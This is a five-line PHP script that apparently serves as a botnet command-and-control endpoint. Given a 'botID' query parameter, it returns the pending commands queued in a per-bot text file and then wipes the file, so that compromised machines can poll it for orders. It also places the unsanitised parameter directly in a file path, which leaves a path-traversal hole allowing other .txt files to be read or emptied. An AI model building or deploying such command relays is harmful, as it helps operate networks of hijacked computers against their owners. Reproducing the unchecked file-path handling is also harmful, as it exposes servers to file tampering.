<?php
$botID = $_GET['botID'];
echo file_get_contents("tmp/cmds-$botID.txt");
file_put_contents("tmp/cmds-$botID.txt", "");
?>
